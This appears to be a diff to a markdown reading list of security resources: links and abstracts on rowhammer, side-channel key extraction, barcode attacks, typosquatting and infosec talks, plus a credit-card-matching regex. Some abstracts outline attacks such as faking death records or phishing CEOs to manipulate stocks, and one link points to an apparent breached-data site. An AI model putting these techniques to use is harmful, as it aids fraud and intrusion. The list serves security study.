+    exploit uses rowhammer-induced bit flips to gain kernel privileges on x86-64
+    Linux when run as an unprivileged userland process. When run on a machine
+    vulnerable to the rowhammer problem, the process was able to induce bit
+    flips in page table entries (PTEs). It was able to use this to gain write
+    access to its own page table, and hence gain read-write access to all of
+    physical memory.
+
+* [Program for testing for the DRAM "rowhammer" problem](https://github.com/google/rowhammer-test)
+* [DRAMA: Exploiting DRAM Addressing for Cross-CPU Attacks](https://arxiv.org/abs/1511.08756)
+* [Breaking IPMI/BMC](http://fish2.com/ipmi/how-to-break-stuff.html)
+* [The Evolution of Protected Processes Part 1: Pass-the-Hash Mitigations in Windows 8.1](http://www.alex-ionescu.com/?p=97)
+* [The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)](https://cseweb.ucsd.edu/~hovav/dist/geometry.pdf)
+
+  * We present new techniques that allow a return-into-libc attack to be mounted
+    on x86 executables that calls no functions at all. Our attack combines a
+    large number of short instruction sequences to build gadgets that allow
+    arbitrary computation. We show how to discover such instruction sequences by
+    means of static analysis. We make use, in an essential way, of the
+    properties of the x86 instruction set.
+
+* [Ultimate beginners guide to phreaking v3.2 - 1999](http://web.textfiles.com/phreak/phreaking.txt)
+
+#### Attribution
+
+* [Cyber Attack Attribution Report](http://whohackedus.com/)
+* [NSARCHIVE - The Cyber Vault](http://nsarchive.gwu.edu/cybervault/)
+
+  * An online resource documenting cyber activities of the U.S. and foreign
+    governments as well as international organizations.
+
+* [IPew Attack Map](http://ocularwarfare.com/ipew/)
+
+#### Barcodes
+
+* [Simplifying the Business Bar Coded Boarding Pass Implementation Guide](http://www.iata.org/whatwedo/stb/documents/bcbp_implementation_guidev4_jun2009.pdf)
+* [What’s contained in a boarding pass barcode?](https://shaun.net/posts/whats-contained-in-a-boarding-pass-barcode)
+* [QR Code interesting](http://datagenetics.com/blog/november12013/index.html)
+* [ClearImage Free Online Barcode Reader / Decoder](http://online-barcode-reader.inliteresearch.com/)
+  [Decoding Small QR-Codes by hand](http://blog.qartis.com/decoding-small-qr-codes-by-hand/)
+* [QR Inception: Barcode-in-Barcode Attacks](https://www.sba-research.org/wp-content/uploads/publications/qrinception.pdf)
+
+  * 2D barcodes offer many benefits compared to 1D barcodes, such as high
+    information density and robustness. Before their introduction to the mobile
+    phone ecosystem, they have been widely used in specific applications, such
+    as logistics or ticketing. However, there are multiple competing standards
+    with different benefits and drawbacks. Therefore, reader applications as
+    well as dedicated devices have to support multiple standards. In this paper,
+    we present novel attacks based on deliberately caused ambiguities when
+    especially crafted barcodes conform to multiple standards. Implementation
+    details decide which standard the decoder locks on. This way, two users
+    scanning the same barcode with different phones or apps will receive
+    different content. This potentially opens way for multiple problems related
+    to security. We describe how embedding one barcode symbology into another
+    can be used to perform phishing attacks as well as targeted exploits. In
+    addition, we evaluate the extent to which popular 2D barcode reader
+    applications on smartphones are susceptible to these barcode-in-barcode
+    attacks. We furthermore discuss mitigation techniques against this type of
+    attack.
+
+#### Breaches
+
+* [Alexsey’s TTPs](https://medium.com/@chrismcnab/alexseys-ttps-1204d9050551#.y2krgov7t)
+
+  * Short writeup on large breaches(Short: Shit ain't secure.)
+
+#### Code Search Engines
+
+* [symbolhound](http://symbolhound.com/)
+
+  * SymbolHound is a search engine that doesn't ignore special characters. This
+    means you can easily search for symbols like &, %, and p. We hope
+    SymbolHound will help programmers-------- find information about their
+    chosen languages and frameworks more easily.
+
+* [grokbit](https://grokbit.com/)
+
+  * Code search engine
+
+#### Crypto
+
+* [RSA Key Extraction via Low-Bandwidth Acoustic Cryptanalysis](http://www.tau.ac.il/~tromer/acoustic/)
+
+  * Here, we describe a new acoustic cryptanalysis key extraction attack,
+    applicable to GnuPG's current implementation of RSA. The attack can extract
+    full 4096-bit RSA decryption keys from laptop computers (of various models),
+    within an hour, using the sound generated by the computer during the
+    decryption of some chosen ciphertexts. We experimentally demonstrate that
+    such attacks can be carried out, using either a plain mobile phone placed
+    next to the computer, or a more sensitive microphone placed 4 meters away.
+
+* [Get Your Hands Off My Laptop: Physical Side-Channel Key-Extraction Attacks On PCs](http://www.tau.ac.il/~tromer/handsoff/)
+
+  * We demonstrated physical side-channel attacks on a popular software
+    implementation of RSA and ElGamal, running on laptop computers. Our attacks
+    use novel side channels and are based on the observation that the "ground"
+    electric potential in many computers fluctuates in a computation-dependent
+    way. An attacker can measure this signal by touching exposed metal on the
+    computer's chassis with a plain wire, or even with a bare hand. The signal
+    can also be measured at the remote end of Ethernet, VGA or USB cables.
+    Through suitable cryptanalysis and signal processing, we have extracted
+    4096-bit RSA keys and 3072-bit ElGamal keys from laptops, via each of these
+    channels, as well as via power analysis and electromagnetic probing. Despite
+    the GHz-scale clock rate of the laptops and numerous noise sources, the full
+    attacks require a few seconds of measurements using Medium Frequency signals
+    (around 2 MHz), or one hour using Low Frequency signals (up to 40 kHz).
+
+#### Databases
+
+* [NIST National Vulnerability Database](https://nvd.nist.gov/ncp/repository)
+* [List of disposable email domains](https://github.com/martenson/disposable-email-domains)
+
+#### Educational
+
+* [Underhanded C contest](http://underhanded-c.org/)
+* [DIY Nukeproofing: A New Dig at “Data-Mining”](https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEFCON-23-3alarmlampscooter-DIY-Nukeproofing.pdf)
+
+#### General Computation
+
+* [Introduction to Resource Oriented Computing - Whitepaper](http://resources.1060research.com/docs/IntroductionToResourceOrientedComputing-1.pdf)
+* [Detecting Automation of Twitter Accounts: Are You a Human, Bot, or Cyborg](http://www.cs.wm.edu/~hnw/paper/tdsc12b.pdf)
+* [A Tale of Two Kernels: Towards Ending Kernel Hardening Wars with Split Kernel](http://split.kernel.build/papers/ccs14.pdf)
+
+  * Abstract: Software security practitioners are often torn between choosing
+    per- formance or security. In particular, OS kernels are sensitive to the
+    smallest performance regressions. This makes it difficult to develop
+    innovative kernel hardening mechanisms: they may inevitably incur some
+    run-time performance overhead. Here, we propose building each kernel
+    function with and without hardening, within a single split kernel . In
+    particular, this allows trusted processes to be run under unmodified kernel
+    code, while system calls of untrusted pro- cesses are directed to the
+    hardened kernel code. We show such trusted processes run with no overhead
+    when compared to an un- modified kernel. This allows deferring the decision
+    of making use of hardening to the run-time. This means kernel distributors,
+    system administrators and users can selectively enable hardening accord- ing
+    to their needs: we give examples of such cases. Although this approach
+    cannot be directly applied to arbitrary kernel hardening mechanisms, we show
+    cases where it can. Finally, our implementa- tion in the Linux kernel
+    requires few changes to the kernel sources and no application source
+    changes. Thus, it is both maintainable and easy to use
+
+* [The Eavesdropper’s Dillemma](http://www.crypto.com/papers/internet-tap.pdf)
+* [Mov is turing ocmplete](http://www.cl.cam.ac.uk/~sd601/papers/mov.pdf)
+* [Towards Optimization-Safe Systems: Analyzing the Impact of Undefined Behavior](http://pdos.csail.mit.edu/~xi/papers/stack-sosp13.pdf)
+
+  * This paper studies an emerging class of software bugs called
+    optimization-unstable code: code that is unexpectedly discarded by compiler
+    optimizations due to undefined behavior in the program. Unstable code is
+    present in many systems, including the Linux kernel and the Postgres
+    database. The consequences of unstable code range from incorrect
+    functionality to missing security checks. To reason about unstable code,
+    this paper proposes a novel model, which views unstable code in terms of
+    optimizations that leverage undefined behavior. Using this model, we
+    introduce a new static checker called Stack that precisely identifies
+    unstable code. Applying Stack to widely used systems has uncovered 160 new
+    bugs that have been confirmed and fixed by developers
+
+* [Annoyances Caused by Unsafe Assumptions](http://uninformed.org/?v=all&a=5&t=sumry)
+
+  * This installation of What Were They Thinking illustrates some of the
+    annoyances that can be caused when developing software that has to
+    inter-operate with third-party applications. Two such cases will be
+    dissected and discussed in detail for the purpose of showing how third-party
+    applications can fail when used in conjunction with software that performs
+    certain tasks. The analysis of the two cases is meant to show how complex
+    failure conditions can be analyzed and used to determine inter-operability
+    problems.
+
+* [Reflections on Trusting Trust](https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf)
+* [Ceremony Design and Analysis](http://eprint.iacr.org/2007/399.pdf)
+
+  * Abstract: The concept of Ceremony is introduced as an extension of the
+    concept of network protocol, with human nodes alongside computer nodes and
+    with communication links that include UI, human-to-human communication and
+    transfers of physical objects that carry data. What is out-of-band to a
+    protocol is in-band to a ceremony, and therefore subject to design and
+    analysis using variants of the same mature techniques used for the design
+    and analysis of protocols. Ceremonies include all protocols, as well as all
+    applications with a user interface, all workflow and all provisioning
+    scenarios. A secure ceremony is secure against both normal attacks and
+    social engineering. However, some secure protocols imply ceremonies that
+    cannot be made secure.
+
+#### Informational
+
+* [Manuals Library](https://www.manualslib.com/)
+* [IA Guidance - NSA](https://www.iad.gov/iad/library/ia-guidance/index.cfm)
+* [Structured Text Tools](https://github.com/dbohdan/structured-text-tools)
+
+  * A list of command line tools for manipulating structured text data
+
+* [What happens when…](https://github.com/alex/what-happens-when)
+
+  * An attempt to answer the age old interview question "What happens when you
+    type google.com into your browser and press enter?"
+
+* [Shakespeare in the Bush An American anthropologist set out to study the Tiv of West Africa and was taught the true meaning of Hamlet.](http://www.naturalhistorymag.com/picks-from-the-past/12476/shakespeare-in-the-bush)
+* [China’s Great Cannon](https://citizenlab.org/2015/04/chinas-great-cannon/)
+
+  * This post describes our analysis of China’s “Great Cannon,” our term for an
+    attack tool that we identify as separate from, but co-located with, the
+    Great Firewall of China. The first known usage of the Great Cannon is in the
+    recent large-scale novel DDoS attack on both GitHub and servers used by
+    GreatFire.org.
+
+#### Informational(non-serious-kinda)
+
+* [Encyclopedia of things considered harmful](http://harmful.cat-v.org/)
+* [“Considered Harmful” Essays Considered Harmful](http://meyerweb.com/eric/comment/chech.html)
+
+#### Internet
+
+* [chipmachine](https://github.com/sasq64/chipmachine)
+* [Wars Within](http://uninformed.org/?v=all&a=26&t=sumry)
+
+  * In this paper I will uncover the information exchange of what may be
+    classified as one of the highest money making schemes coordinated by
+    'organized crime'. I will elaborate on information gathered from a third
+    party individual directly involved in all aspects of the scheme at play. I
+    will provide a detailed explanation of this market's origin, followed by a
+    brief description of some of the actions strategically performed by these
+    individuals in order to ensure their success. Finally, I will elaborate on
+    real world examples of how a single person can be labeled a spammer, malware
+    author, cracker, and an entrepreneur gone thief. For the purposes of
+    avoiding any legal matters, and unwanted media, I will refrain from
+    mentioning the names of any individuals and corporations who are involved in
+    the schemes described in this paper.
+
+* [Seven Months’ Worth of Mistakes: A Longitudinal Study of Typosquatting Abuse](https://lirias.kuleuven.be/bitstream/123456789/471369/3/typos-final.pdf)
+
+  * Abstract: Typosquatting is the act of purposefully registering a domain name
+    that is a mistype of a popular domain name. It is a concept that has been
+    known and studied for over 15 years, yet still thoroughly practiced up until
+    this day. While previous typosquatting studies have always taken a snapshot
+    of the typosquatting landscape or base their longitudinal results only on
+    domain registration data, we present the first content- based , longitudinal
+    study of typosquatting. We collected data about the typosquatting domains of
+    the 500 most popular sites of the Internet every day, for a period of seven
+    months, and we use this data to establish whether previously discovered
+    typosquatting trends still hold today, and to provide new results and
+    insights in the typosquatting landscape. In particular we reveal that, even
+    though 95% of the popular domains we investigated are actively targeted by
+    typosquatters, only few trademark owners protect themselves against this
+    practice by proactively registering their own typosquatting domains. We take
+    advantage of the longitudinal aspect of our study to show, among other
+    results, that typosquatting domains change hands from typosquatters to
+    legitimate owners and vice versa, and that typosquatters vary their
+    monetization strategy by hosting different types of pages over time. Our
+    study also reveals that a large fraction of typosquatting domains can be
+    traced back to a small group of typosquatting page hosters and that certain
+    top-level domains are much more prone to typosquatting than others
+
+#### News
+
+* [U.S. Department of Health and Human Services Office for Civil Rights Breach Portal: Notice to the Secretary of HHS Breach of Unsecured Protected Health Information](https://ocrportal.hhs.gov/ocr/breach/breach_report.jsf)
+* [Medical Device Law: Compliance Issues, Best Practices and Trends - American Bar Association](https://www.americanbar.org/content/dam/aba/events/cle/2015/10/ce1510mdm/ce1510mdm_interactive.authcheckdam.pdf)
+* [LeakedSource.ru](https://leakedsource.ru/)
+
+#### Political
+
+* [Drone Survival Guide](http://dronesurvivalguide.org)
+* [They clapped](http://www.econlib.org/library/Columns/y2007/Mungergouging.html)
+* [NSA's Legal Authorities](http://electrospaces.blogspot.com/2015/09/nsas-legal-authorities.html)
+
+#### Random
+
+* [what3words](https://what3words.com/about/)
+
+  * what3words provides a precise and incredibly simple way to talk about
+    location. We have divided the world into a grid of 3m x 3m squares and
+    assigned each one a unique 3 word address.
+
+#### Side Channel Attacks
+
+* [A Practical Methodology for Measuring the Side-Channel Signal Available to the Attacker for Instruction-Level Event](http://users.ece.gatech.edu/~az30/Downloads/Micro14.pdf)
+
+  * Abstract: This paper presents a new metric, which we call Signal Available
+    to Attacker (SAVAT), that measures the side channel signal created by a
+    specific single-instruction difference in program execution, i.e. the amount
+    of signal made available to a potential attacker who wishes to decide
+    whether the program has executed instruction/event A or instruction/event B.
+    We also devise a practical methodology for measuring SAVAT in real systems
+    using only user-level access permissions and common measurement equipment.
+    Finally, we perform a case study where we measure electromagnetic (EM)
+    emanations SAVAT among 11 different instructions for three different laptop
+    systems. Our findings from these experiments confirm key intuitive
+    expectations, e.g. that SAVAT between on-chip instructions and off-chip
+    memory accesses tends to be higher than between two on-chip instructions.
+    However, we find that particular instructions, such as integer divide, have
+    much higher SAVAT than other instructions in the same general category
+    (integer arithmetic), and that last-level-cache hits and misses have similar
+    (high) SAVAT. Overall, we confirm that our new metric and methodology can
+    help discover the most vulnerable aspects of a processor architecture or a
+    program, and thus inform decision-making about how to best manage the
+    overall side channel vulnerability of a processor, a program, or a system.
+
+* [Palinopsia - Is your VirtualBox reading your E-Mail? Reconstruction of FrameBuffers from VRAM](https://hsmr.cc/palinopsia/)
+
+#### Services
+
+#### Timelines
+
+* [Timeline/List of low-level attacks/persistence techniques. HIGHLY RECOMMENDED!](http://timeglider.com/timeline/5ca2daa6078caaf4)
+* [Timeline of Software/Timing Attestation papers](http://timeglider.com/timeline/be11d685a7c4374d)
+* [Internet Timeline](https://www.zakon.org/robert/internet/timeline/)
+
+##### Regex for credit cards
+
+* [Link](http://www.regular-expressions.info/creditcard.html)
+
+```
+* ^(?:4[0-9]{12}(?:[0-9]{3})?         # Visa
+* |  5[1-5][0-9]{14}                  # MasterCard
+* |  3[47][0-9]{13}                   # American Express
+* |  3(?:0[0-5]|[68][0-9])[0-9]{11}   # Diners Club
+* |  6(?:011|5[0-9]{2})[0-9]{12}      # Discover
+* |  (?:2131|1800|35\d{3})\d{11}      # JCB
+*)$
+```
+
+### Interesting Talks/Videos
+
+* [You and Your Research - Haroon Meer](https://www.youtube.com/watch?v=JoVx_-bM8Tg)
+
+  * What does it take to do quality research? What stops you from being a
+    one-hit wonder? Is there an age limit to productive hackery? What are the
+    key ingredients needed and how can you up your chances of doing great work?
+    In a talk unabashedly stolen from far greater minds we hope to answer these
+    questions and discuss their repercussions.
+
+* [Bootstrapping A Security Research Project Andrew Hay](https://www.youtube.com/watch?v=gNU2J-IcK4E)
+
+  * It has become increasingly common to see a headline in the mainstream media
+    talking about the latest car, television, or other IoT device being hacked
+    (hopefully by a researcher). In each report, blog, or presentation, we learn
+    about the alarming lack of security and privacy associated with the device's
+    hardware, communications mechanisms, software/app, and hosting
+    infrastructure in addition to how easy it might be for an attacker to take
+    advantage of one, or multiple, threat vectors. The truth is, anyone can
+    perform this kind of research if given the right guidance. To many security
+    professionals, however, the act of researching something isn,t the
+    problem...it's what to research, how to start, and when to stop. Academics
+    think nothing of researching something until they feel it's "done" (or their
+    funding/tenure runs out). Security professionals, however, often do not have
+    that luxury. This session will discuss how to research, well, ANYTHING.
+    Proven methods for starting, continuing, ending, leading, and collaborating
+    on reproducible research will be discussed - taking into account real-world
+    constraints such as time, money, and a personal life. We will also discuss
+    how to generate data, design your experiments, analyze your results, and
+    present (and in some cases defend) your research to the public.
+
+* [A talk about (info-sec) talks - Haroon Meer ](https://www.youtube.com/watch?v=BlVjdUkrSFY)
+
+  * Last year there was an Information Security conference taking place for
+    almost every day of the year. This translates to about 15 information
+    security talks per day, every day. The question is, is this a bad thing?
+    Even niche areas of the info-sec landscape have their own dedicated
+    conference these days. Is this a good thing?
+
+* [Take Charge of Your Infosec Career! - Glen Roberts - BSidesSLC2015](https://www.youtube.com/watch?v=QqlnB2FeODo)
+
+  * You spent $5,000, a plane trip, a hotel and a full workweek on your last
+    infosec course but when was the last time you invested even just a few hours
+    of your time exclusively to developing your infosec career in a truly
+    meaningful way? This talk will challenge the way you view your career and
+    give you actionable steps for taking charge of it so you can optimize the
+    rewards and fulfillment you receive from your work. Glen will leverage the
+    stories and best practices from dozens of information security professionals
+    to help inspire your infosec career journey. This presentation will be
+    engaging and speak to the soul in a way that instills ownership of your own
+    career and generates a passion for finding and carving out your own
+    authentic career path.
+
+* [Con Video Rig Enhancements - IronGeek & SkyDog](https://www.youtube.com/watch?v=BVCFAqLxdtY)
+
+#### Attacking/PenTester/RedTeam
+
+* [I Will Kill You - Chris Rock](https://www.youtube.com/watch?feature=youtu.be&v=9FdHq3WfJgs&t=77&app=desktop)
+
+  * Have you ever wanted to kill someone? Do you want to get rid of your
+    partner, your boss or your arch nemesis? Perhaps you want to enjoy your life
+    insurance payout whilst you’re still alive. Do you have rich elderly parents
+    that just won’t die quick enough? Or do you want a “Do Over” new identity.
+    Then, this presentation is for you! I’ll provide you with the insight and
+    techniques on how to “kill” someone and obtain a real death certificate and
+    shutdown their lives. It focuses on the lack of security controls that allow
+    any of us to virtually kill off anyone or any number of people. Forget the
+    Dexter way of killing someone, I’ll show you how to avoid the messy clean up
+    and focusing in on the digital aspects. You could be dead right now and not
+    even know it.
+
+* [Kim Jong-il and Me: How to Build a Cyber Army to Defeat the U.S. - Charlie MIller](https://www.youtube.com/watch?v=4up0yTGlpaU)
+* [Evaluating the APT Armor - Matthias Luft, Felix Wilhelm](https://www.youtube.com/watch?v=3vh2s9Pui0E)
+* [How to Hack All the Transport Networks of a Country - Defcon20](https://www.youtube.com/watch?v=D6KEhdHFc9I)
+* [How to safely conduct shenanigans EvilMog Renderman - Derbycon7](https://www.youtube.com/watch?v=Ca0DA9Dq1IA&index=61&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+* [If it fits - it sniffs: Adventures in WarShipping](http://www.irongeek.com/i.php?page=videos/derbycon4/t104-if-it-fits-it-sniffs-adventures-in-warshipping-larry-pesce)
+
+#### Educational
+
+* [Con Video Rig Enhancements - IronGeek & SkyDog](https://www.youtube.com/watch?v=BVCFAqLxdtY)
+* [How to Become an InfoSec Autodidact - Kelly Shortridge - Duo Tech Talk](https://www.youtube.com/watch?v=h92vmwg9Tyc)
+* [Volatile Memory: Behavioral Game Theory in Defensive Security](https://www.slideshare.net/kshortridge/volatile-memory-behavioral-game-theory-in-defensive-security)
+* [The Art of Explanation: Behavioral Models of InfoSec - Kelly Shortridge](https://www.youtube.com/embed/UdZDlt2dlqM?)
+* [301 The Road to Hiring is Paved in Good Intentions Tim OBrien](https://www.youtube.com/watch?v=sdkf8SIj1rU)
+* [Ermahgerd: Lawrs - Robert Heverly - Anycon17](http://www.irongeek.com/i.php?page=videos/anycon2017/305-ermahgerd-lawrs-prof-robert-heverly)
+
+  * When do you, and other coders, hackers, developers, and tinkerers, think or
+    worry about the law? If your answer is, ?Not very often,? then this talk is
+    for you. We all need to think about the law. And it's not just privacy, or
+    computer fraud, or even anti-circumvention law, that we should think about.
+    We need to think about law as a whole and how it can help us do or stop us
+    from doing what we want to do. This talk will start with a broad overview of
+    the ways in which we implicate law when we do what we do, and then will
+    focus on what that means for us and the broader implications that can arise
+    from our various activities. Do you think the law would stop you from doing
+    what you want to do or punish you for doing it? It might, but it also might
+    not. If you think it does, do you think you should be able to do what you
+    want to do? If you do, then we need to hack the law, and to do that we?ll
+    need to talk to the legal coders, those writers of our cultural software.
+    This talk will tackle not only law and working with code, but also why it
+    matters for us to be aware of the law and engaged in improving it.
+
+* [The Impact of Dark Knowledge and Secrets on Security and Intelligence Professionals - Richard Thieme](https://www.youtube.com/watch?v=0MzcPBAj88A&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe)
+
+  * Dismissing or laughing off concerns about what it does to a person to know
+    critical secrets does not lessen the impact on life, work, and relationships
+    of building a different map of reality than “normal people” use. One has to
+    calibrate narratives to what another believes. One has to live defensively,
+    warily. This causes at the least cognitive dissonance which some manage by
+    denial. But refusing to feel the pain does not make it go away. It just
+    intensifies the consequences when they erupt. Philip K. Dick said, reality
+    is that which, when you no longer believe in it, does not go away. When
+    cognitive dissonance evolves into symptoms of traumatic stress, one ignores
+    those symptoms at one’s peril. But the very constraints of one’s work often
+    make it impossible to speak aloud about those symptoms, because that might
+    threaten one’s clearances, work, and career. And whistle blower protection
+    is often non-existent.
+
+* [Weapons of Mass Distraction](http://conference.hitb.org/hitbsecconf2014kul/materials/D2T1%20-%20Haroon%20Meer%20Azhar%20Desai%20and%20Marco%20Slaviero%20-%20Weapons%20of%20Mass%20Distraction.pdf)
+
+  * In this talk, we aim to briefly cover the background of sock puppets (and
+    related attacks) before moving on to real world demonstrations & “attacks“.
+    Rigging polls, abusing Twitter, causing Reddit riots & targeting popular
+    news organisations are some of the (many) attacks covered. In all these
+    cases we discuss what we tried, what worked, what didn’t and what the
+    implications are of the attacks. Where possible we will cover defences and
+    solutions.
+
+* [Youre stealing it wrong 30 years of inter pirate battles - Jason Scott - Defcon 18](https://www.youtube.com/watch?v=a5AceLYWE1Q&app=desktop)
+* [[TROOPERS15] Andreas Lindh - Defender Economics](https://www.youtube.com/watch?v=mAP38Xy52X0)
+
+#### Genuinely Interesting/Unusual
+
+* [Achilles Heel of the American Banking System](http://www.irongeek.com/i.php?page=videos/derbycon4/the-achilles-heel-of-the-banking-system)
+* [You're Leaking Trade Secrets - Defcon22 Michael Schrenk](https://www.youtube.com/watch?v=JTd5TL6_zgY)
+
+  * Networks don't need to be hacked for information to be compromised. This is
+    particularly true for organizations that are trying to keep trade secrets.
+    While we hear a lot about personal privacy, little is said in regard to
+    organizational privacy. Organizations, in fact, leak information at a much
+    greater rate than individuals, and usually do so with little fanfare. There
+    are greater consequences for organizations when information is leaked
+    because the secrets often fall into the hands of competitors. This talk uses
+    a variety of real world examples to show how trade secrets are leaked
+    online, and how organizational privacy is compromised by seemingly innocent
+    use of The Internet.
+
+* [Exploiting Network Surveillance Cameras Like a Hollywood Hacker - Black Hat 2013](https://www.youtube.com/watch?v=B8DjTcANBx0)
+* [Paypals War on Terror - Chaos Communication Congress 31](http://ccc2.mirror.xt0.org/congress/2014/webm-hd/31c3-6377-en-de-Paypals_War_on_Terror_webm-hd.webm)
+* [CompSci in the DPRK](http://us2.1und1.c3voc.de/congress/2014/webm-hd/31c3-6253-en-de-Computer_Science_in_the_DPRK_webm-hd.webm)
+* [Disrupting an Adware-serving Skype Botnet](http://phishme.com/disrupting-an-adware-serving-skype-botnet/)
+
+  * Not crazy technical or anything, moreso an interesting tale that shows one
+    person with a little bit of skill can disrupt malvertising campaigns with a
+    little legwork.
+
+* [Software Supply Chains and the Illusion of Control - Derek Weeks](http://www.irongeek.com/i.php?page=videos/bsidesnova2017/107-software-supply-chains-and-the-illusion-of-control-derek-weeks)
+
+  * In this presentation I am sharing the results of a three-year, industry-wide
+    study on open source development and security practices across 3,000
+    organizations and 25,000. I will detail how these organizations are
+    employing a vast community of open source component suppliers, warehouses,
+    and development tools that take the form of software supply chains. Modern
+    software development practices are now consuming BILLIONS of open source and
+    third-party components. The tooling with package managers and build tools
+    such as Maven, Gradle, npm, NuGet, RubyGems and others has promoted the
+    usage of components to a convenient standard practice. As a result, 90% of a
+    typical application is now composed of open source components. The good
+    news: use of the components is improving developer productivity and
+    accelerating time to market. However, using these components brings
+    ownership and responsibility with it and this fact is largely overlooked.
+    The unspoken truth: not all parts are created equal. For example, 1 in 16
+    components in use include known security vulnerabilities. Ugh. This session
+    aims to enlighten development professionals by sharing results from the
+    State of the Software Supply Chain reports from 2015 through 2017. The
+    reports blend of public and proprietary data with expert research and
+    analysis. Attendees in this session will learn: - What our analysis of
+    25,000 applications reveals about the quality and security of software built
+    with open source components - How organizations like Mayo Clinic, Exxon,
+    Capital One, the U.S. FDA and Intuit are utilizing the principles of
+    software supply chain automation to improve application security - Why
+    avoiding open source components over 3 years old might be a really good
+    idea - How to balance the need for speed with quality and security -- early
+    in the development lifecycle We will also discuss how you can best approach
+    the effort for development teams to identify, track and replace components
+    with known vulnerabilities, while getting more products and new features to
+    market quickly. Attend this session and gain insight as to how your
+    organization’s application development practices compare to others. I'll
+    share the industry benchmarks to take back and discuss with your
+    development, security, and open source governance teams.
+
+* [Hacks, Lies, & Nation States - Mario DiNatale - ANYCON 2017](http://www.irongeek.com/i.php?page=videos/anycon2017/303-hacks-lies-nation-states-mario-dinatale)
+
+  * A hilarious and non-technical skewering of the current state of
+    Cybersecurity, the Cybersecurity
+
+* [Money Makes Money: How To Buy An ATM And What You Can Do With It by Leigh Ann Galloway - BSides Manchester2017](https://www.youtube.com/watch?v=0HbLQAGS6no&index=8&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
+* [(In)Outsider Trading – Hacking stocks using public information and (influence) - Robert Len - BSides CapeTown16](https://www.youtube.com/watch?v=sfHeguTEkuE)
+
+  * This talk will take a look at how inadvertently leaked technical information
+    from businesses, can be used to successfully trade stocks. This results in
+    making huge profits. We look at different methods of influencing the stock
+    market, such as DDOS attacks (at critical time periods) and simple
+    techniques such as Phish-baiting CEO’s to acquire sensitive, relevant
+    information that can be applied in the real world to make massive gains in
+    profit. We will also take a look at historic trends. How previous hacks,
+    breaches and DDOS attacks have affected stock prices and investor confidence
+    over time. Specific reference will be made towards listed South African
+    companies (Or a particular listed SA company) and a POC will hopefully be
+    completed by the presentation date.
+
+* [Pwning pwners like a n00b](https://www.youtube.com/watch?v=E8O8bB3I3i0)
+
+  * Cybercrime, blackhat hackers and some Ukrainians. If that doesn’t catch your
+    attention, then stop reading. Follow the story of how stupid mistakes, OPSEC
+    fails, and someone with a little too much time on his hands was able to
+    completely dismantle a spamming and webshell enterprise using really simple
+    skills and techniques you could pick up in a week. Did we mention that d0x
+    were had as well? This talk will be an in-depth examination at the
+    investigation and exploitation process involved.
+
+* [Human Trafficking in the Digital Age](https://www.irongeek.com/i.php?page=videos/derbycon4/t516-human-trafficking-in-the-digital-age-chris-jenks)
+
+#### Insider Threats
+
+* [Combating the Insider Threat at the FBI: Real World Lessons Learned - BlackHat2013](https://www.youtube.com/watch?v=0stTS-G5FsE)
+
+#### Policy
+
+* [Just What The Doctor Ordered? - Scott Erven and Shawn Merdinger - DEF CON 22](https://www.youtube.com/watch?v=wTEMSBXtkAc)
+
+  * This discussion will also highlight the fallout from security standards not
+    being a requirement for medical device manufacturers, and our experience in
+    identifying and reporting vulnerabilities. We will provide our insight into
+    what needs to be done for healthcare organizations to respond to the new
+    threat of cyber-attack against medical devices. We are working towards a
+    future where cyber security issues in medical devices are a thing of the
+    past. We will discuss the recent success and traction we have gained with
+    healthcare organizations, federal agencies and device manufacturers in
+    addressing these security issues. The train is now moving, so please join us
+    to find out how you can get involved and make a difference by ensuring
+    patient safety.
+
+* [Psychology of Security - Stefan Schumacher - Trooper14](https://www.youtube.com/watch?v=vZKAi4RAIvA)
+
+  * In this talk I will introduce the Institute’s research programme about the
+    Psychology of Security. We are going to research the psychological basics of
+    IT security, including: How do people experience IT security? How are they
+    motivated? How do they learn? Why do people tend to make the same mistakes
+    again and again (Buffer Overflow, anyone?)? What can we do to prevent
+    security incidents? Which curricula should be taught about IT security?
+
+* [Killing you softly Josh Bressers](http://www.irongeek.com/i.php?page=videos/circlecitycon2016/302-killing-you-softly-josh-bressers)
+
+  * The entire security industry has a serious skill problem. We,re technically
+    able, but we have no soft skills. We can,t talk to normal people at all. We
+    can barely even talk to each other, and it's killing our industry. Every
+    successful industry relies on the transfer of skills from the experienced to
+    the inexperienced. Security lacks this today. If I asked you how you learned
+    what you know about security, what would your answer be? In most cases you
+    learned everything you know on your own. There was minimal learning from
+    someone else. This has left us with an industry full of magicians, but even
+    worse it puts us in a place where there is no way to transfer skill and
+    knowledge from one generation to the next. Magicians don,t scale. If we
+    think about this in the context of how we engage non security people it's
+    even worse! Most non security people have no idea what security is, what
+    security does, or even why security is important. It's easy to laugh at the
+    horrible security problems almost everything has today, but in reality we,re
+    laughing at ourselves. Historically we,ve blamed everything else for this
+    problem when in reality it's 100% our fault. One of the our great weaknesses
+    is failing to get the regular people to understand security and why it's
+    important. This isn,t a surprise if you think about how the industry
+    communicates. We can barely talk to each other, how can we possibly talk to
+    someone who doesn,t know anything about security? Normal people are confused
+    and scared, they want to do the right thing but they have no idea what that
+    is. The future leaders in security are going to have to be able to teach and
+    talk to their security peers, but more importantly they will have to engage
+    everyone else. Security is being paid attention to like never before, and
+    yet we have nothing to say to anyone. What has changed in the last few
+    years? If we don,t do our jobs, someone else will do them for us, and we,re
+    not going to like the results. Security isn,t a technical problem, technical
+    problems are easy, security is a communication problem. Communications
+    problems are difficult. Let's figure out how we can fix that.
+
+* [Bridging the Air Gap: Cross Domain Solutions - Patrick Orzechowski](https://www.irongeek.com/i.php?page=videos/bsideslasvegas2014/pg08-bridging-the-air-gap-cross-domain-solutions-patrick-orzechowski)
+
+  * For years the government has been using CDS to bridge networks with
+    different classification levels. This talk will focus on what CDS systems
+    are, how they’re built, and what kind of configurations are common in the
+    wild. Furthermore, we’ll look at testing techniques to evaluate the security
+    of these systems and potential ways to exploit holes in configuration and
+    design. We’ll also look at the ways the commercial world might benefit from
+    a data and type-driven firewall as well as some of the downfalls and
+    negative aspects of implementing a cross-domain system.
+
+#### Political
+
+* [Coming War on General Computation](https://www.youtube.com/watch?v=HUEvRyemKSg)
